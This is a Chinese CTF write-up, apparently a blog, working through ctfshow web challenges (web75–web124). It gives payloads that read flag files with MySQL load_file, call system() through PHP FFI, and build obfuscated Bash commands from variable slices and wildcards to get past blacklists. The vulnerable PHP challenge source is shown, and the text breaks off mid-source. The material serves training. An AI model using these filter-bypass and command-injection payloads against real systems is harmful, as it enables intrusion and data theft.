<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="k">try</span> <span class="p">{</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=localhost;dbname=ctftraining&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s1">&#39;root&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;select load_file(&#34;/flag36.txt&#34;)&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="p">;</span> <span class="p">}</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">null</span><span class="p">;}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$e</span><span class="o">-</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">&gt;</span><span class="nx">getMessage</span><span class="p">();</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);}</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<ol>
<li>数据库连接建立：
<ul>
<li><code>$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');</code></li>
<li>这行代码使用 PDO 创建了一个与 MySQL 数据库的连接对象 <code>$dbh</code>。它指定了数据库服务器的主机名为 <code>localhost</code>，要连接的数据库名称是 <code>ctftraining</code>，以及用于登录数据库的用户名 <code>root</code> 和密码 <code>root</code>。如果连接成功，后续就可以通过这个对象进行数据库相关的操作；如果连接失败，将会抛出一个 <code>PDOException</code> 异常。</li>
</ul>
</li>
<li>执行查询操作：
<ul>
<li><code>foreach($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row)</code></li>
<li>这里通过已建立的数据库连接对象 <code>$dbh</code> 执行了一个 SQL 查询语句 <code>select load_file(&quot;/flag36.txt&quot;)</code>。<code>load_file()</code> 是 MySQL 中的一个函数，用于读取指定路径的文件内容。这个查询语句的目的就是获取服务器上 <code>/flag36.txt</code> 文件的内容。</li>
<li>然后使用 <code>foreach</code> 循环来遍历查询结果集。每次循环，<code>$row</code> 将会获取到查询结果集中的一行数据，由于查询结果只有一列（即 <code>load_file()</code> 函数返回的文件内容那一列），所以可以通过 <code>$row[0]</code> 来获取这一列的值。</li>
</ul>
</li>
</ol>
<h4 id="结果输出与资源释放">结果输出与资源释放<a hidden class="anchor" aria-hidden="true" href="#结果输出与资源释放">#</a></h4>
<ol>
<li>结果输出：
<ul>
<li><code>echo($row[0]).&quot;|&quot;;</code></li>
<li>在每次遍历查询结果集的循环中，这行代码将获取到的文件内容（通过 <code>$row[0]</code>）输出到屏幕上，并在后面添加一个 <code>|</code> 作为分隔符。</li>
</ul>
</li>
<li>数据库连接资源释放：
<ul>
<li><code>$dbh = null;</code></li>
<li>当查询结果处理完毕后，这行代码将数据库连接对象 <code>$dbh</code> 设置为 <code>null</code>，这有助于释放与该连接相关的资源，确保系统资源的合理利用。</li>
</ul>
</li>
</ol>
<h4 id="异常处理">异常处理<a hidden class="anchor" aria-hidden="true" href="#异常处理">#</a></h4>
<ol>
<li>捕获异常：
<ul>
<li><code>catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}</code></li>
<li>整个 <code>try</code> 代码块被放置在一个 <code>try-catch</code> 语句中。如果在尝试建立数据库连接或执行查询等操作过程中出现任何 <code>PDOException</code> 异常（比如数据库连接失败、查询语句语法错误等情况），异常将会被这个 <code>catch</code> 块捕获。</li>
<li>一旦捕获到异常，<code>catch</code> 块中的代码将会执行。这里首先通过 <code>$e-&gt;getMessage()</code> 获取到具体的异常消息，并将其输出到屏幕上，然后使用 <code>exit(0)</code> 终止脚本的执行，以防止后续可能出现的错误或未定义行为。</li>
</ul>
</li>
</ol></blockquote>
<h4 id="web76">web76<a hidden class="anchor" aria-hidden="true" href="#web76">#</a></h4>
<p><img alt="image-20241130003249705" loading="lazy" src="assets/image-20241130003249705.png"></p>
<p>这题依旧是用glob协议查目录，得到文件名为flag36d.txt</p>
<p>用上一题mysql的方法，成功查到flag</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$conn = mysqli_connect(&#34;127.0.0.1&#34;, &#34;root&#34;, &#34;root&#34;, &#34;ctftraining&#34;); $sql = &#34;select load_file(&#39;/flag36d.txt&#39;) as a&#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[&#39;a&#39;]; } exit();
</code></pre><h4 id="web77">web77<a hidden class="anchor" aria-hidden="true" href="#web77">#</a></h4>
<p><img alt="image-20241130004911319" loading="lazy" src="assets/image-20241130004911319.png"></p>
<p>用glob协议的方法查出flag文件为flag36x.php，还有一个readflag文件</p>
<p>接下来要看看怎么查文件</p>
<p><img alt="image-20241130005425204" loading="lazy" src="assets/image-20241130005425204.png"></p>
<p>上两题用到的读flag的方法（mysql）这题用不了，需要想点其他的方法</p>
<p>官方的wp用 PHP 中的 FFI（Foreign Function Interface）方法来调用 C 语言的 system 函数，并执行一个 Shell 命令。</p>
<blockquote>
<h5 id="什么是ffi">什么是FFI?<a hidden class="anchor" aria-hidden="true" href="#什么是ffi">#</a></h5>
<p>PHP FFI（Foreign Function Interface）是 PHP 7.4 及以上版本引入的一个强大功能。它允许 PHP 代码直接调用 C 语言函数，从而实现了 PHP 与 C 语言的高效交互。这为 PHP 开发者提供了一种利用 C 语言的高性能和底层操作系统功能的方式。</p></blockquote>
<p>payload:</p>
<pre tabindex="0"><code>$ffi = FFI::cdef(&#34;int system(const char *command);&#34;);//创建一个system对象
$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的
$ffi-&gt;system($a);//通过$ffi去调用system函数
</code></pre><p>通过执行目录中的 /readflag 程序并将其输出重定向到文件 1.txt中（因为只是执行的话没有回显）</p>
<p>执行一下</p>
<p><img alt="image-20241130011301444" loading="lazy" src="assets/image-20241130011301444.png"></p>
<p>看到有回显应该是成功了，访问一下1.txt</p>
<p><img alt="image-20241130011352138" loading="lazy" src="assets/image-20241130011352138.png"></p>
<p>由于当前用户权限不足我们是不能直接读flag36x.php文件中的内容的，只能通过readflag（脚本里面会进行提权）来读</p>
<h4 id="web118">web118<a hidden class="anchor" aria-hidden="true" href="#web118">#</a></h4>
<p>原文地址：https://blog.csdn.net/Myon5/article/details/140145005</p>
<p>输入数字和小写字母，回显 evil input</p>
<p><img alt="img" loading="lazy" src="./assets/39825df758159aeb1423f84893826541.png"></p>
<p>查看源码，发现这里会将提交的参数 code 传给 system 函数</p>
<p><img alt="img" loading="lazy" src="./assets/ef28276a3cf0375675a6bde71506fcec.png"></p>
<p>使用 burpsuite 抓包进行单个字符的模糊测试 fuzz：</p>
<p><img alt="img" loading="lazy" src="./assets/584e4b78646d635bd58f6507fe24c725.png"></p>
<p>发现过滤掉了数字和小写字母以及一些符号，下面框起来的部分是可用的</p>
<p><img alt="img" loading="lazy" src="./assets/cce43cb38968e67bc8db9d0b7dec6750.png"></p>
<p>结合题目提示：flag 在 flag.php</p>
<p><img alt="img" loading="lazy" src="./assets/8eb2710f201069ae75d2229e71d76be1.png"></p>
<p>那么我们就需要构造出命令去读取 flag.php</p>
<blockquote>
<p>我们先来了解一下 Linux 的内置变量
在 Linux 系统中，有许多内置变量（环境变量）用于配置系统行为和存储系统信息。</p>
<p>（1）$BASH</p>
<p>描述：指向当前使用的Bash解释器的路径。
示例：/bin/bash
用途：用于确定正在使用的Bash版本和路径。</p>
<p>（2） $PATH</p>
<p>描述：存储一系列路径，这些路径用于查找可执行文件，当你在命令行中输入命令时，系统会在这些路径中查找对应的可执行文件。
示例：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
用途：影响命令的查找和执行，可以添加自定义脚本或程序的路径。</p>
<p>（3）$HOME</p>
<p>描述：当前用户的主目录路径。
示例：/home/username
用途：表示当前用户的主目录，通常用于存储用户配置文件和个人数据。</p>
<p>（4）$PWD</p>
<p>描述：当前工作目录（Present Working Directory）。
示例：/home/username/projects
用途：表示当前的工作目录路径，常用于脚本和命令中获取或显示当前目录。</p>
<p>（5）$USER</p>
<p>描述：当前登录的用户名。
示例：username
用途：表示当前用户的名称，常用于显示或检查用户信息。</p>
<p>（6）$SHELL</p>
<p>描述：当前用户的默认shell。
示例：/bin/bash
用途：表示用户登录时使用的默认shell路径。</p>
<p>（7）$UID</p>
<p>描述：当前用户的用户ID。
示例：1000（普通用户），0（root用户）
用途：标识当前用户的唯一ID。</p>
<p>（8）$IFS</p>
<p>描述：内部字段分隔符（Internal Field Separator），用于分割输入的字段，默认为空格、制表符和换行符。
示例：默认值为<space><tab><newline>
用途：影响脚本中的字段分割，常用于处理输入和解析文本。</p></blockquote>
<p>此外还有很多的内置变量：</p>
<p><img alt="img" loading="lazy" src="./assets/3b6a3d156d5f7a2118ef1e73708dc47f.png"></p>
<p>接下来我们需要知道 Bash 变量的切片，与 python 的切片类似，目的还是从指定位置开始提取子字符串，用法：${VAR:offset:length}，看例子：</p>
<pre tabindex="0"><code>${PWD:1:2}
</code></pre><p>提取从第二个字符开始的两个字符，即 ro，在 Bash 中，字符串切片的索引也是从 0 开始的。</p>
<p><img alt="img" loading="lazy" src="./assets/9a68ddaee573e2a4c8f029c1b1439303.png"></p>
<p>如果只填一个参数，会默认从指定的位置开始提取到字符串的末尾：</p>
<pre tabindex="0"><code>${PWD:3}
</code></pre><p><img alt="img" loading="lazy" src="./assets/05801ab65baf0c3f8ef755d2440035d3.png"></p>
<p>简单测一下我们就可以看出波浪号的效果：从结尾开始取</p>
<p><img alt="img" loading="lazy" src="./assets/05801ab65baf0c3f8ef755d2440035d3-20250107141042427.png"></p>
<p>但是这里数字被过滤了，因此我们使用大写字母绕过：</p>
<p>可以发现任意的大小写字母与数字 0 等效</p>
<p><img alt="img" loading="lazy" src="./assets/20028ec8b263329b22bf7127236e5cb9.png"></p>
<p>不难想到这里的 $PWD 应该是 /var/www/html（网页服务所在的常见路径）；</p>
<p>而 $PATH 的结尾应该也是 /bin（这个在前面我们已经测试过了）。</p>
<p><img alt="img" loading="lazy" src="./assets/1f28e989351c75dc265bdf60244d9bad.png"></p>
<p>因此我们可以构造出 nl 命令来读取 flag.php，由于 ? 可用，因此我们可以进行通配，绕过字母的过滤，构造 payload：</p>
<pre tabindex="0"><code>${PATH:~Q}${PWD:~Q} ????.???
</code></pre><p><img alt="img" loading="lazy" src="./assets/22118ba0371383bb7b3ff39f6dd322be.png"></p>
<p>当然题目还给了其他 payload：</p>
<pre tabindex="0"><code>${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
</code></pre><p>在Bash中，${#var} 的语法用于获取变量 var 的长度（即字符数）。</p>
<p>这种形式可以应用于任何变量，无论是字符串变量还是环境变量。</p>
<p>我们知道 ${HOME} 是 /root，因此 ${#HOME} 就是 5。</p>
<p><img alt="img" loading="lazy" src="./assets/699d0549b84964404cd7c602c5a687d5.png"></p>
<p>以此类推，最终将这些数字应用到切片中去，绕过对数字的过滤，构造出我们想要执行的命令。</p>
<h4 id="web119">Web119<a hidden class="anchor" aria-hidden="true" href="#web119">#</a></h4>
<p>先用上一题的payload打了一下，显示evil input</p>
<p>测了一下上题用的PATH被ban了</p>
<p>换个方法</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
相当于/???/??t ????.???
匹配/bin/cat ????.???
</code></pre><p>${#SHLVL}}=1</p>
<p>${PWD::${#SHLVL}} = /</p>
<p>${#HOSTNAME}=4    //用户名的位数，这里用户名是root，故为4</p>
<p>另一种方法</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
相当于/???/?????4 ????.??? 或者 /???/?????5 ????.???
想要匹配/bin/base64 ????.???
</code></pre><p>{#RANDOM} = 4或5</p>
<p>由于可能是5，所以要多试几次，还要进行base64解码</p>
<h4 id="web120">web120<a hidden class="anchor" aria-hidden="true" href="#web120">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题把上题的HOME也ban了，但是第二种方法还能出，而且长度也符合</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
</code></pre><p><img alt="image-20250118212249002" loading="lazy" src="assets/image-20250118212249002.png"></p>
<p>或</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
</code></pre><h4 id="web121">web121<a hidden class="anchor" aria-hidden="true" href="#web121">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题SHLVL被ban了，可以用?代替</p>
<p>${#?}=1</p>
<p>payload</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
</code></pre><p>或</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???
/bin/rev
</code></pre><p>rev是倒叙输出的</p>
<h4 id="web122">web122<a hidden class="anchor" aria-hidden="true" href="#web122">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题把PWD和#也ban掉了</p>
<p>可以考虑用$?来代替${#1}</p>
<p>$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p>
<p>所以我们可以构造payload:</p>
<pre tabindex="0"><code>&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? 
</code></pre><blockquote>
<p>&lt;A指令不知道是啥，埋个坑</p></blockquote>
<h4 id="web124">web124<a hidden class="anchor" aria-hidden="true" href="#web124">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: 收集自网络
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-06 14:04:45
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="c1">//例子 c=20-1
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="c1"></span>    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;太长了不会算&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的字符&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="c1">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="c1"></span>    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;abs&#39;</span><span class="p">,</span> <span class="s1">&#39;acos&#39;</span><span class="p">,</span> <span class="s1">&#39;acosh&#39;</span><span class="p">,</span> <span class="s1">&#39;asin&#39;</span><span class="p">,</span> <span class="s1">&#39;asinh&#39;</span><span class="p">,</span> <span class="s1">&#39;atan2&#39;</span><span class="p">,</span> <span class="s1">&#39;atan&#39;</span><span class="p">,</span> <span class="s1">&#39;atanh&#39;</span><span class="p">,</span> <span class="s1">&#39;base_convert&#39;</span><span class="p">,</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span> <span class="s1">&#39;ceil&#39;</span><span class="p">,</span> <span class="s1">&#39;cos&#39;</span><span class="p">,</span> <span class="s1">&#39;cosh&#39;</span><span class="p">,</span> 